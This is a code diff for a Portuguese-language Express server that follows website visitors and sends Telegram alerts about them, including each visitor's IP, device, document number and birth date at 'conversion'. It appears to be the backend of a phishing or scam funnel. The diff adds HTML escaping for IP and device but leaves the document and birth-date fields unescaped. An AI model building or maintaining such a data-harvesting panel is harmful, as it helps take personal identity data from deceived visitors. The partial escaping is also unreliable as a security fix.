@@ -703,12 +703,21 @@ async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: 
   }
 }
 
+function escapeHtml(text: string | undefined | null) {
+  if (!text) return "";
+  return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
 app.post("/api/v1/session/start", async (req, res) => {
   const { device, location, userId } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
   if (sessions.has(userId)) return res.json({ status: "exists" });
   const startTime = Date.now();
-  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${ip}\n<b>Device:</b> ${device}\n<b>Status:</b> 🟢 Navegando...`);
+  
+  const safeIp = escapeHtml(String(ip));
+  const safeDevice = escapeHtml(String(device));
+  
+  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
   sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
   saveVisitors();
   res.json({ status: "started", userId });
@@ -728,7 +737,9 @@ app.post("/api/v1/session/convert", async (req, res) => {
     session.converted = true;
     session.docValue = details.docValue;
     session.birthDate = details.birthDate;
-    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
+    
+    const safeIp = escapeHtml(session.ip);
+    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
     await sendTelegram(msg, session.messageId || undefined);
     saveVisitors();
     res.json({ status: "converted" });
@@ -773,7 +784,8 @@ app.post("/api/v1/session/end", async (req, res) => {
   const { userId } = req.body;
   const session = sessions.get(userId);
   if (session && !session.converted) {
-    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
+    const safeIp = escapeHtml(session.ip);
+    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
     sessions.delete(userId);
   }
   res.json({ status: "ok" });
@@ -784,7 +796,8 @@ setInterval(async () => {
   const now = Date.now();
   for (const [userId, session] of sessions.entries()) {
     if (!session.converted && now - session.lastHeartbeat > 60000) {
-      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
+      const safeIp = escapeHtml(session.ip);
+      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
       sessions.delete(userId);
     }
   }
